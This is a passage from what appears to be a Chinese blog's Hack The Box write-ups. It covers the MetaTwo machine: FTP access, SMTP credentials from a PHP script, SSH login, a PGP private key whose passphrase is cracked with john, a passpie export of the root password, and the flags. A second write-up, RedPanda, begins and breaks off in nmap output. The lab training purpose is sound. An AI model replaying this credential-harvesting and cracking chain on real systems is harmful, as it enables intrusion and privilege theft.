10.10.11.186.\n220 ProFTPD Server (Debian) [::ffff:10.10.11.186]\nName (10.10.11.186:root): metapress.htb\n331 Password required for metapress.htb\nPassword: \n230 User metapress.htb logged in\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n229 Entering Extended Passive Mode (|||1913|)\n150 Opening ASCII mode data connection for file list\ndrwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog\ndrwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer\n226 Transfer complete\nftp> cd mailer\n250 CWD command successful\nftp> ls\n229 Entering Extended Passive Mode (|||27331|)\n150 Opening ASCII mode data connection for file list\ndrwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer\n-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php\n226 Transfer complete\nftp> get send_email.php\nlocal: send_email.php remote: send_email.php\n229 Entering Extended Passive Mode (|||3114|)\n150 Opening BINARY mode data connection for send_email.php (1126 bytes)\n100% |**********************************************************************************************************************************************************************|  1126        5.45 MiB/s    00:00 ETA\n226 Transfer complete\n1126 bytes received in 00:00 (4.08 KiB/s)\n```\n这里看到有一个 send\\_email.php 文件，然后下载下来了\n\n```php\n┌──(root㉿kali)-[~/Desktop]\n└─# cat send_email.php \n<?php\n/*\n * This script will be used to send an email to all our users when ready for launch\n*/\n\nuse PHPMailer\\PHPMailer\\PHPMailer;\nuse PHPMailer\\PHPMailer\\SMTP;\nuse PHPMailer\\PHPMailer\\Exception;\n\nrequire 'PHPMailer/src/Exception.php';\nrequire 'PHPMailer/src/PHPMailer.php';\nrequire 'PHPMailer/src/SMTP.php';\n\n$mail = new PHPMailer(true);\n\n$mail->SMTPDebug = 3;                               \n$mail->isSMTP();            \n\n$mail->Host = \"mail.metapress.htb\";\n$mail->SMTPAuth = true;                          \n$mail->Username = \"jnelson@metapress.htb\";                 \n$mail->Password = \"Cb4_JmWM8zUZWMu@Ys\";                           \n$mail->SMTPSecure = \"tls\";                           \n$mail->Port = 587;                                   \n\n$mail->From = \"jnelson@metapress.htb\";\n$mail->FromName = \"James Nelson\";\n\n$mail->addAddress(\"info@metapress.htb\");\n\n$mail->isHTML(true);\n\n$mail->Subject = \"Startup\";\n$mail->Body = \"<i>We just started our new blog metapress.htb!</i>\";\n\ntry {\n    $mail->send();\n    echo \"Message has been sent successfully\";\n} catch (Exception $e) {\n    echo \"Mailer Error: \" . $mail->ErrorInfo;\n}\n```\n```bash\n$mail->Username = \"jnelson@metapress.htb\";                 \n$mail->Password = \"Cb4_JmWM8zUZWMu@Ys\";  \n```\n可以看到这里的账户在之前的 /etc/passwd 中有出现，并且是有 /bin/bash 权限的，这样我们就得到了一个 ssh 账户\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# ssh jnelson@10.10.11.186\nThe authenticity of host '10.10.11.186 (10.10.11.186)' can't be established.\nED25519 key fingerprint is SHA256:0PexEedxcuaYF8COLPS2yzCpWaxg8+gsT1BRIpx/OSY.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.186' (ED25519) to the list of known hosts.\njnelson@10.10.11.186's password: \nLinux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Dec 31 18:52:04 2022 from 10.10.14.96\njnelson@meta2:~$ whoami&&id\njnelson\nuid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)\n```\n成功拿到 user 权限\n\n```bash\njnelson@meta2:~$ cat user.txt \nbfe452b37100243ff838f397eac125e9\n```\n成功拿到 user\n\n权限的 flag 文件\n\n# 权限提升\n```bash\njnelson@meta2:~$ ls -la\ntotal 32\ndrwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 .\ndrwxr-xr-x 3 root    root    4096 Oct  5 15:12 ..\nlrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null\n-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout\n-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 .bashrc\ndrwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local\ndr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie\n-rw-r--r-- 1 jnelson jnelson  807 Jun 26  2022 .profile\n-rw-r----- 1 root    jnelson   33 Dec 31 19:18 user.txt\n```\n```bash\njnelson@meta2:~/.passpie/ssh$ ls -la\ntotal 16\ndr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 .\ndr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 ..\n-r-xr-x--- 1 jnelson jnelson  683 Oct 25 12:52 jnelson.pass\n-r-xr-x--- 1 jnelson jnelson  673 Oct 25 12:52 root.pass\n```\n在目录 /home/jnelson/.passpie/ssh 下有一个 root.pass，感觉挺有意思的，查看一下内容\n\n```bash\njnelson@meta2:~/.passpie/ssh$ cat root.pass \ncomment: ''\nfullname: root@ssh\nlogin: root\nmodified: 2022-06-26 08:58:15.621572\nname: ssh\npassword: '-----BEGIN PGP MESSAGE-----\n\n\n  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2\n\n  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km\n\n  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED\n\n  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf\n\n  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg\n\n  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw\n\n  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr\n\n  lpF0RatbxQGWBks5F3o=\n\n  =uh1B\n\n  -----END PGP MESSAGE-----\n\n  '\n```\n然后还有一个 .keys 文件，但是我们没有权限访问，将它下载到本地\n\n```bash\nscp jnelson@10.10.11.186:.passpie/.keys keys\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# cat .keys         \n-----BEGIN PGP PUBLIC KEY BLOCK-----\n\n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\nfo6KI+w2uXLaw+bIT1XZurDN\n=dqsF\n-----END PGP PUBLIC KEY BLOCK-----\n-----BEGIN PGP PRIVATE KEY BLOCK-----\n\n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\n=7Uo6\n-----END PGP PRIVATE KEY BLOCK-----\n```\n然后我删除了 .keys 中的 public 密钥\n\n```bash\n-----BEGIN PGP PRIVATE KEY BLOCK-----\n\n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\n=7Uo6\n-----END PGP PRIVATE KEY BLOCK-----\n```\n接着去破解 PGP 文件\n\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# gpg2john keys > gpg.john\n\nFile keys\n```\n```bash\n┌──(root㉿kali)-[~/Desktop]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt gpg.john   \nUsing default input encoding: UTF-8\nLoaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])\nCost 1 (s2k-count) is 65011712 for all loaded hashes\nCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes\nCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nblink182         (Passpie)     \n1g 0:00:00:03 DONE (2022-12-31 14:37) 0.3105g/s 50.93p/s 50.93c/s 50.93C/s ginger..blink182\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n得到了一个密码 blink182\n\n使用我们的密码去导出 passpie 的密码\n\n```bash\njnelson@meta2:~/.passpie$ passpie list\n╒════════╤═════════╤════════════╤═══════════╕\n│ Name   │ Login   │ Password   │ Comment   │\n╞════════╪═════════╪════════════╪═══════════╡\n│ ssh    │ jnelson │ ********   │           │\n├────────┼─────────┼────────────┼───────────┤\n│ ssh    │ root    │ ********   │           │\n╘════════╧═════════╧════════════╧═══════════╛\njnelson@meta2:~/.passpie$ cd ../\njnelson@meta2:~$ touch pass\njnelson@meta2:~$ passpie export pass\nPassphrase: \njnelson@meta2:~$ cat pass\ncredentials:\n- comment: ''\n  fullname: root@ssh\n  login: root\n  modified: 2022-06-26 08:58:15.621572\n  name: ssh\n  password: !!python/unicode 'p7qfAZt4_A1xo_0x'\n- comment: ''\n  fullname: jnelson@ssh\n  login: jnelson\n  modified: 2022-06-26 08:58:15.514422\n  name: ssh\n  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'\nhandler: passpie\nversion: 1.0\n```\n得到了 root 账户的密码\n\n```bash\nusername = root\npassword = p7qfAZt4_A1xo_0x\n```\n去切换到 root 用户\n\n```bash\njnelson@meta2:~$ su root\nPassword: \nroot@meta2:/home/jnelson# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n得到了 root 权限\n\n```bash\nroot@meta2:/home/jnelson# cat /root/root.txt\n8af8be1e265388ed685c674d029175ca\n```\n得到了 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"RedPanda - Hackthebox - 未做提权","url":"/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/","content":"\n# Hackthebox - RedPanda\n# 靶场信息\n![](Hackthebox-RedPanda/8adaa92c-602e-42fe-a8fa-e1863d6e2ae5.png)\n\n# 靶场类型\n![](Hackthebox-RedPanda/45267983-d5ed-40f3-bef8-d71fa254d799.png)\n\n# 信息收集\n## Nmap\n```bash\nnmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.170\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 09:15 CST\nNmap scan report for 10.10.11.170\nHost is up (0.41s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n8080/tcp open  http-proxy\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 200\n|     Content-Type: text/html;charset=UTF-8\n|     Content-Language: en-US\n|     Date: Sun, 23 Oct 2022 01:16:00 GMT\n|     Connection: close\n|     <!DOCTYPE html>\n|     <html lang=\"en\" dir=\"ltr\">\n|     <head>\n|     <meta charset=\"utf-8\">\n|     <meta author=\"wooden_k\">\n|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->\n|     <link rel=\"stylesheet\" href=\"css/panda.css\" type=\"text/css\">\n|     <link rel=\"stylesheet\" href=\"css/main.css\" type=\"text/css\">\n|     <title>Red Panda Search | Made with Spring Boot</title>\n|     </head>\n|     <body>\n|     <div class='pande'>\n|     <div class='ear left'></div>\n|     <div class='ear right'></div>\n|     <div class='whiskers left'>\n|     <span></span>\n|     <span></span>\n|     <span></span>\n|     </div>\n|     <div class='whiskers right'>\n|     <span></span>\n|     <span></span>\n|     <span></span>\n|     </div>\n|     <div class='face'>\n|     <div class='eye\n|   HTTPOptions:\n|     HTTP/1.1 200\n|     Allow: GET,HEAD,OPTIONS\n|     Content-Length: 0\n|     Date: Sun, 23 Oct 2022 01:16:01 GMT\n|     Connection: close\n|   RTSPRequest:\n|     HTTP/1.1 400\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Sun, 23 Oct 2022 01:16:02 GMT\n|     Connection: close\n|     <!doctype html><html lang=\"en\"><head><title>HTTP Status 400\n|     Request</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400\n|_    Request</h1></body></html>\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: Red Panda Search | Made with Spring Boot\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.92%I=7%D=10/23%Time=635495D0%P=arm-apple-darwin21.5.0%\nSF:r(GetRequest,690,\"HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/html;ch\nSF:arset=UTF-8\\r\\nContent-Language:\\x20en-US\\r\\nDate:\\x20Sun,\\x2023\\x20Oct\nSF:\\x202022\\x2001:16:00\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!DOCTYPE\\x2\nSF:0html>\\n<html\\x20lang=\\\"en\\\"\\x20dir=\\\"ltr\\\">\\n\\x20\\x20<head>\\n\\x20\\x20\\\nSF:x20\\x20<meta\\x20charset=\\\"utf-8\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20author=\\\"w\nSF:ooden_k\\\">\\n\\x20\\x20\\x20\\x20<!--Codepen\\x20by\\x20khr2003:\\x20https://co\nSF:depen\\.io/khr2003/pen/BGZdXw\\x20-->\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"sty\nSF:lesheet\\\"\\x20href=\\\"css/panda\\.css\\\"\\x20type=\\\"text/css\\\">\\n\\x20\\x20\\x2\nSF:0\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/main\\.css\\\"\\x20type=\\\"te\nSF:xt/css\\\">\\n\\x20\\x20\\x20\\x20<title>Red\\x20Panda\\x20Search\\x20\\|\\x20Made\\\nSF:x20with\\x20Spring\\x20Boot</title>\\n\\x20\\x20</head>\\n\\x20\\x20<body>\\n\\n\\\nSF:x20\\x20\\x20\\x20<div\\x20class='pande'>\\n\\x20\\x20\\x20\\x20\\x20\\x20<div\\x20\nSF:class='ear\\x20left'></div>\\n\\x20\\x20\\x20\\x20\\x20\\x20<div\\x20class='ear\\\nSF:x20right'></div>\\n\\x20\\x20\\x20\\x20\\x20\\x20<div\\x20class='whiskers\\x20le\nSF:ft'>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<span></span>\\n\\x20\\x20\\x\nSF:20\\x2